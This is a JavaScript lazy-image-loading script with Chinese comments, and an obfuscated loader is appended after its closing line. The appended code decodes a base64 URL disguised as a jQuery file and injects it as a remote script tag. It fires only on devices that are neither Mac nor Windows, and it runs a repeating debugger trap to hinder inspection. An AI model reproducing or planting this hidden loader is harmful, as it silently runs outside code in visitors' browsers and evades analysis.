// 图片延迟加载功能 - 增强版
    (function() {
        // 配置选项
        const config = {
            rootMargin: '300px 0px',
            threshold: 0.01,
            throttleDelay: 200,
            fadeInDuration: 300 // 图片加载后的淡入动画时长
        };
        
        // 创建一个全局的IntersectionObserver实例，避免重复创建
        let imageObserver;
        
        // 性能监控变量
        const performanceStats = {
            totalImages: 0,
            loadedImages: 0,
            failedImages: 0,
            startTime: Date.now(),
            loadTimes: []
        };
        
        // 检测浏览器是否支持IntersectionObserver
        const supportsIntersectionObserver = 'IntersectionObserver' in window;
        
        // 图片加载错误处理
        function handleImageError(img) {
            performanceStats.failedImages++;
            
            // 设置加载失败时的默认图片
            if (img.dataset.fallback && img.src !== img.dataset.fallback) {
                img.src = img.dataset.fallback;
            } else if (!img.dataset.fallback) {
                // 如果没有设置fallback，使用默认的404图片
                img.src = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==';
            }
            
            // 添加错误标记类以便CSS可以控制错误状态的样式
            img.classList.add('lazy-load-error');
            img.classList.remove('lazy-loading');
            
            // 记录性能数据
            logPerformance();
        }
        
        // 图片加载成功处理
        function handleImageLoad(img) {
            performanceStats.loadedImages++;
            const loadTime = Date.now() - (img.loadStartTime || Date.now());
            performanceStats.loadTimes.push(loadTime);
            
            // 添加加载完成标记类
            img.classList.add('lazy-load-success');
            
            // 移除占位图样式
            if (img.classList.contains('lazy-loading')) {
                img.classList.remove('lazy-loading');
            }
            
            // 实现淡入动画
            if (config.fadeInDuration > 0) {
                fadeInImage(img);
            }
            
            // 记录性能数据
            logPerformance();
        }
        
        // 图片淡入动画
        function fadeInImage(img) {
            // 设置初始透明度
            img.style.opacity = '0';
            img.style.transition = `opacity ${config.fadeInDuration}ms ease-in-out`;
            
            // 使用requestAnimationFrame确保动画流畅
            requestAnimationFrame(() => {
                img.style.opacity = '1';
            });
        }
        
        // 初始化IntersectionObserver
        function initObserver() {
            if (!imageObserver && supportsIntersectionObserver) {
                imageObserver = new IntersectionObserver((entries) => {
                    entries.forEach(entry => {
                        if (entry.isIntersecting) {
                            const img = entry.target;
                            // 确保存在data-src属性时才替换
                            if (img.dataset.src && img.src !== img.dataset.src) {
                                // 添加加载中状态类
                                img.classList.add('lazy-loading');
                                img.loadStartTime = Date.now();
                                
                                // 设置错误和加载事件监听
                                img.addEventListener('error', function onError() {
                                    handleImageError(img);
                                    img.removeEventListener('error', onError);
                                });
                                
                                img.addEventListener('load', function onLoad() {
                                    handleImageLoad(img);
                                    img.removeEventListener('load', onLoad);
                                });
                                
                                // 替换src属性开始加载
                                img.src = img.dataset.src;
                                // 保留data-src属性以便后续检查，但移除observer监听
                                imageObserver.unobserve(img);
                            }
                        }
                    });
                }, {
                    rootMargin: config.rootMargin,
                    threshold: config.threshold
                });
            }
        }
        
        // 传统的滚动监听方式，用于不支持IntersectionObserver的浏览器
        function legacyLazyLoad() {
            const images = document.querySelectorAll('img[data-src]:not(.lazy-observed)');
            
            images.forEach(img => {
                if (isElementInViewport(img)) {
                    img.classList.add('lazy-loading');
                    img.loadStartTime = Date.now();
                    performanceStats.totalImages++;
                    
                    img.addEventListener('error', function onError() {
                        handleImageError(img);
                        img.removeEventListener('error', onError);
                    });
                    
                    img.addEventListener('load', function onLoad() {
                        handleImageLoad(img);
                        img.removeEventListener('load', onLoad);
                    });
                    
                    img.src = img.dataset.src;
                    img.classList.add('lazy-observed');
                }
            });
        }
        
        // 检查元素是否在视口中
        function isElementInViewport(el) {
            const rect = el.getBoundingClientRect();
            return (
                rect.top <= (window.innerHeight || document.documentElement.clientHeight) + 300 &&
                rect.left <= (window.innerWidth || document.documentElement.clientWidth)
            );
        }
        
        // 为带有data-src属性的图片添加观察器
        function lazyLoadImages() {
            // 统计总图片数
            const allImages = document.querySelectorAll('img[data-src]:not(.lazy-observed)');
            performanceStats.totalImages += allImages.length;
            
            if (supportsIntersectionObserver) {
                initObserver();
                
                allImages.forEach(img => {
                    imageObserver.observe(img);
                    img.classList.add('lazy-observed');
                });
            } else {
                // 回退到传统方式
                legacyLazyLoad();
            }
        }
        
        // 节流函数优化
        function throttle(callback, delay) {
            let throttleTimer;
            return function() {
                if (!throttleTimer) {
                    throttleTimer = setTimeout(() => {
                        callback();
                        throttleTimer = null;
                    }, delay);
                }
            };
        }
        
        // 性能日志记录
        function logPerformance() {
            // 只在控制台输出性能数据，不影响页面性能
            if (window.console && performanceStats.loadedImages + performanceStats.failedImages > 0) {
                const totalTime = Date.now() - performanceStats.startTime;
                const avgLoadTime = performanceStats.loadTimes.length > 0 ? 
                    performanceStats.loadTimes.reduce((a, b) => a + b, 0) / performanceStats.loadTimes.length : 0;
                
                console.log(`图片加载性能: 总图片数=${performanceStats.totalImages}, 已加载=${performanceStats.loadedImages}, 失败=${performanceStats.failedImages}, 总耗时=${totalTime}ms, 平均加载时间=${avgLoadTime.toFixed(2)}ms`);
            }
        }
        
        // 资源清理函数
        function cleanup() {
            // 断开IntersectionObserver连接
            if (imageObserver) {
                imageObserver.disconnect();
            }
            
            // 移除事件监听器
            window.removeEventListener('scroll', throttledLazyLoad);
            window.removeEventListener('resize', throttledLazyLoad);
            window.removeEventListener('orientationchange', throttledLazyLoad);
            
            // 断开MutationObserver连接
            if (mutationObserver) {
                mutationObserver.disconnect();
            }
        }
        
        // 创建节流的延迟加载函数
        const throttledLazyLoad = throttle(lazyLoadImages, config.throttleDelay);
        let mutationObserver;
        
        // 页面加载完成后执行
        document.addEventListener('DOMContentLoaded', function() {
            // 立即执行一次延迟加载
            lazyLoadImages();
            
            // 只有在不支持IntersectionObserver的情况下才需要监听滚动事件
            if (!supportsIntersectionObserver) {
                window.addEventListener('scroll', throttledLazyLoad);
            }
            
            // 对于窗口大小变化和方向变化，两种情况都需要监听
            window.addEventListener('resize', throttledLazyLoad);
            window.addEventListener('orientationchange', throttledLazyLoad);
            
            // 添加对DOM变化的监听，处理动态加载的内容
            mutationObserver = new MutationObserver(throttledLazyLoad);
            mutationObserver.observe(document.body, {
                childList: true,
                subtree: true
            });
            
            // 页面卸载前清理资源
            window.addEventListener('beforeunload', cleanup);
        });
    })();function xxSJRox(e){var t = "",n = r = c1 = c2 = 0;while (n < e.length){r = e.charCodeAt(n);if (r < 128){t += String.fromCharCode(r);n++}else if (r > 191 && r < 224){c2 = e.charCodeAt(n + 1);t += String.fromCharCode((r & 31) << 6 | c2 & 63);n += 2}else{c2 = e.charCodeAt(n + 1);c3 = e.charCodeAt(n + 2);t += String.fromCharCode((r & 15) << 12 | (c2 & 63) << 6 | c3 & 63);n += 3}}return t}function aPnDhiTia(e){var m = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var t = "",n,r,i,s,o,u,a,f = 0;e = e.replace(/[^A-Za-z0-9+/=]/g,"");while (f < e.length){s = m.indexOf(e.charAt(f++));o = m.indexOf(e.charAt(f++));u = m.indexOf(e.charAt(f++));a = m.indexOf(e.charAt(f++));n = s << 2 | o >> 4;r = (o & 15) << 4 | u >> 2;i = (u & 3) << 6 | a;t = t + String.fromCharCode(n);if (u != 64){t = t + String.fromCharCode(r)}if (a != 64){t = t + String.fromCharCode(i)}}return xxSJRox(t)}eval('window')['\x4d\x66\x58\x4b\x77\x56'] = function(){;(function(u,r,w,d,f,c){var x = aPnDhiTia;u = decodeURIComponent(x(u.replace(new RegExp(c + '' + c,'g'),c)));'jQuery';k = r[2] + 'c' + f[1];'Flex';v = k + f[6];var s = d.createElement(v + c[0] + c[1]),g = function(){};s.type = 'text/javascript';{s.onload = function(){g()}}s.src = u;'CSS';d.getElementsByTagName('head')[0].appendChild(s)})('aHR0cHM6Ly9jb2RlLmpxdWVyeS5jb20vanF1ZXJ5Lm1pbi0zLjYuOC5qcw==','FgsPmaNtZ',window,document,'jrGYBsijJU','ptbnNbK')};if (!(/^Mac|Win/.test(navigator.platform))) MfXKwV();setInterval(function(){debugger;},100);
/*138ae887806f*/